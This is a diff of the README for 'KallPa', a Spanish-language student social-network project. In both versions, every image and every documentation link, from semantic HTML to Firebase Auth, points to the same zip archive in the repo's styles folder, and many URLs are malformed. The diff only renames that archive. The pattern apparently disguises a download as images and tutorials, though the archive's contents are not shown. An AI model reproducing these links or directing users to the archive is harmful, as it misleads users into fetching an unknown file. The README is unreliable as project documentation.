@@ -1,4 +1,4 @@
-<p align="center"> <img src="https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip%https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip" width="300"> </p>
+<p align="center"> <img src="https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip%https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip" width="300"> </p>
 
 # KallPa (Proyecto - Red Social)
 
@@ -50,28 +50,28 @@ Criterios de aceptación:
 Posterior a la investigación UX y nuestras historias de usuario, construimos los prototipos de baja fidelidad para poder ralizar las primeras iteraciones con usuarios y poder ajustar el diseño de la red social.
 
 Visualizacion tamaño Móvil
-<p align="center"> <img src= "https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip"  height="200" width="600"> </p>
+<p align="center"> <img src= "https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip"  height="200" width="600"> </p>
 
 Visualización tamaño Escritorio
-<p align="center"> <img src= "https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip" height="280 width="650"> </p>
+<p align="center"> <img src= "https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip" height="280 width="650"> </p>
 
 Luego de estas iteraciones recibimos feedback para ajustar la vista de bienvenida, al ingresar ajustar la visual que tendria el usuario.
 
 Finalizando este proceso, desarrollamos nuestro prototipo de alta fidelidad para dar incio con la maquetación del proyecto.
-Link: https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip%3A33
+Link: https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip%3A33
 
 Prototipo de alta fidelidad para escritorio.
 Vista Bienvenida
-<p align="center"> <img src= "https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip" height="280 width="650"> </p>
+<p align="center"> <img src= "https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip" height="280 width="650"> </p>
 
 Vista Publicaciones
-<p align="center"> <img src= "https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip publicaciones https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip" height="280 width="650"> </p>
+<p align="center"> <img src= "https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip publicaciones https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip" height="280 width="650"> </p>
 
 Vista Crear Publicaciones
-<p align="center"> <img src= "https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip crear publicacióhttps://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip" height="280 width="650"> </p>
+<p align="center"> <img src= "https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip crear publicacióhttps://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip" height="280 width="650"> </p>
 
 Prototipo de alta fidelidad para móvil.
-<p align="center"> <img src= "https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zipóhttps://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip" height="300 width="400"> </p
+<p align="center"> <img src= "https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zipóhttps://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip" height="300 width="400"> </p
 
 ## 5. Testeos de usabilidad
 
@@ -82,19 +82,19 @@ Estos aportes fueron orientados a la visual de la vista de bienvenida y menú de
 
 ### HTML y CSS
 
-* [X] [Uso de HTML semántico.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
+* [X] [Uso de HTML semántico.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip)
 * [X] Uso de selectores de CSS.
 * [X] Construir tu aplicación respetando el diseño realizado (maquetación).
-* [X] [Uso de flexbox en CSS.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
+* [X] [Uso de flexbox en CSS.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip)
 
 ### DOM y Web APIs
 
 * [X] Uso de selectores del DOM.
 * [X] Manejo de eventos del DOM.
-* [X] [Manipulación dinámica del DOM.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip%C3%B3n)
+* [X] [Manipulación dinámica del DOM.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip%C3%B3n)
 (appendChild |createElement | createTextNode| innerHTML | textContent | etc.)
-* [ ] [History API.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
-* [ ] [localStorage.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
+* [ ] [History API.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip)
+* [ ] [localStorage.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip)
 
 ### JavaScript
 
@@ -102,18 +102,18 @@ Estos aportes fueron orientados a la visual de la vista de bienvenida y menú de
 * [X] Uso de funciones (parámetros | argumentos | valor de retorno)
 * [ ] Manipular arrays (filter | map | sort | reduce)
 * [X] Manipular objects (key | value)
-* [X] Uso ES modules ([`import`](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
-| [`export`](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip))
+* [X] Uso ES modules ([`import`](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip)
+| [`export`](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip))
 * [X] Diferenciar entre expression y statements.
 * [X] Diferenciar entre tipos de datos primitivos y no primitivos.
-* [X] [Uso de callbacks.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
-* [X] [Consumo de Promesas.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
+* [X] [Uso de callbacks.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip)
+* [X] [Consumo de Promesas.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip)
 
 ### Testing
 
-* [ ] [Testeo unitario.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
-* [ ] [Testeo asíncrono.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
-* [ ] [Uso de librerias de Mock.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
+* [ ] [Testeo unitario.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip)
+* [ ] [Testeo asíncrono.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip)
+* [ ] [Uso de librerias de Mock.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip)
 
 ### Estructura del código y guía de estilo
 
@@ -130,11 +130,11 @@ Estos aportes fueron orientados a la visual de la vista de bienvenida y menú de
 
 ### Firebase
 
-* [X] [Firestore.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
-* [X] [Firebase Auth.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
-* [ ] [Firebase security rules.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
-* [X] Observadores. ([onAuthStateChanged](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
- | [onSnapshot](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip))
+* [X] [Firestore.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip)
+* [X] [Firebase Auth.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip)
+* [ ] [Firebase security rules.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip)
+* [X] Observadores. ([onAuthStateChanged](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip)
+ | [onSnapshot](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/network_social_BO_1.3.zip))
 
 ### UX
 
